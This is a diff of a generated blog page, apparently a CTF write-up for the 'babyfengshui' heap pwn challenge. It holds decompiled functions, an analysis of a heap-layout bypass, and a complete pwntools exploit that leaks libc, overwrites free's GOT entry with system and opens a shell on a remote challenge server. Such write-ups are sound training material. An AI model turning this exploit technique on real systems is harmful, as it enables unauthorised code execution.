[esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; user_index &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (v3 + *ptr[a1]) &gt;= ptr[a1] - <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    <span class="built_in">read_name</span>(*ptr[a1], v3 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>delete</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; user_index &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*ptr[a1]);</span><br><span class="line">    <span class="built_in">free</span>(ptr[a1]);</span><br><span class="line">    ptr[a1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>display</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">display</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; user_index &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: %s\n&quot;</span>, ptr[a1] + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;description: %s\n&quot;</span>, *ptr[a1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>We can see in <code>delete()</code> it set pointers as <code>NULL</code> which leads to no <code>UAF</code>.</p>
+<p>From <code>add()</code> we can find that in <code>ptr</code> it stores a structure:<br><img src="/imghost/apcaw/hg2.svg" alt="Struct"><br>This explains why in <code>update()</code> it checks <code>(v3 + *ptr[a1]) &gt;= ptr[a1] - 4</code>, because it looks right. The content of <code>s</code> should not disturb the <code>size</code> of chunk <code>v2</code> (<code>prev_size</code> is used by <code>s</code>). </p>
+<p>The question is: it works only when chunk <code>v2</code> and chunk <code>s</code> are adjacent!!!</p>
+<p>If we add 2 <code>0x80</code> user first:<br><img src="/imghost/apcaw/hg3.svg" alt="Step 1"><br>Then free <code>user0</code>:<br><img src="/imghost/apcaw/hg4.svg" alt="Step 2"><br>Then add a <code>0x100</code> user, you will see:<br><img src="/imghost/apcaw/hg5.svg" alt="Step 3"><br>Now the <code>v2</code> and <code>s</code> of <code>user2</code> are not adjacent, so the restriction in <code>update()</code> can be bypassed.</p>
+<p>Next we hijack <code>GOT</code> (without <code>atoi</code>, we use <code>free</code>), leak <code>libc</code> base address and calculate <code>system</code> to execute.  </p>
+<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>The given <code>libc</code> is 2.19 but on remote that’s 2.23 (using <code>Libcsearcher</code> to get).</p>
+<p>It got <code>alarm()</code> inside, and <code>LibcSearcher</code> takes too much time, so we use <code>ELF</code> module in <code>pwntools</code> to load <code>libc</code> and calculate address.</p>
+<p>While <code>/lib32/libc.so.6</code> on ubuntu16.04 is also improper, so I choose to use <code>libc6-i386_2.23-0ubuntu10_amd64</code> in the database of <code>LibcSearcher</code>, and it works.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;57400&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib32/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6-i386_2.23-0ubuntu10_amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name, text</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;size of description: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name: &#x27;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index, length, text</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index0&#x27;</span>,<span class="string">&#x27;text0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index1&#x27;</span>,<span class="string">&#x27;text1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;text2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_addr = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; LibcSearcher takes too long</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;free&#x27;,free_addr)  </span></span><br><span class="line"><span class="string">libc_base = free_addr - libc.dump(&#x27;free&#x27;)  </span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
+        </div>
 
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
+        
 
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/stack-overflow/">#stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/heap/">#heap</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/uaf/">#uaf</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/got/">#got</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
-        .name {
-          color: var(--default-text-color);
-        }
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/09/20/2020-09-20-ADWorld-PWN-Challenge-Area-Write-ups-Unlink/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (Unlink)</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/08/14/2020-08-14-ADWorld-PWN-Challenge-Area-Write-ups-UAF/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (UAF)</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
 
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-
-  .post-tags-box {
-    display: none;
-    margin-top: 1.6rem;
-    justify-content: center;
-    font-size: 1.1rem;
-
-    +keep-tablet() {
-      display: flex;
-    }
-
-    +keep-mobile() {
-      margin-top: 1.2rem;
-      font-size: 1rem;
-    }
-
-
-    .tag-item {
-      margin: 0 0.25rem;
-    }
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-
-    +keep-tablet() {
-      margin-top: $component-spacing-value * 0.8;
-    }
-  }
-
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+        
+    </div>
+</div>
 
 
                 
@@ -475,80 +523,11 @@ $article-title-font-size = 1.6rem;
 
     
         <aside class="page-aside">
-            .post-toc-wrap {
-  width: 100%;
-  font-size: 0.92rem;
-  box-sizing: border-box;
-
-  .post-toc {
-
-    ol {
-      list-style: none;
-      margin: 0;
-      padding: 0 2px 12px 10px;
-      text-align: left;
-
-      &:last-child {
-        padding-bottom: 0;
-      }
-
-      > ol {
-        padding-left: 0;
-      }
-
-      a {
-        transition-property: all;
-        transition();
-      }
-    }
-
-
-    .nav-item {
-      line-height: 1.8;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-
-    .nav {
-      .nav-child {
-        display: hexo-config('toc.expand_all') ? block : none;
-      }
-
-      .active > .nav-child {
-        display: block;
-      }
-
-      .active-current > .nav-child {
-        display: block;
-
-        > .nav-item {
-          display: block;
-        }
-      }
-
-
-      .nav-number, .nav-text {
-        color: var(--default-text-color);
-      }
-
-      .active > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-
-      .active-current > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-    }
-  }
-}
-
-
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recho"><span class="nav-number">1.</span> <span class="nav-text">Recho</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note-service2"><span class="nav-number">2.</span> <span class="nav-text">note-service2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-1"><span class="nav-number">2.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyfengshui"><span class="nav-number">3.</span> <span class="nav-text">babyfengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-2"><span class="nav-number">3.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-2"><span class="nav-number">3.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+</div>
         </aside>
     
 
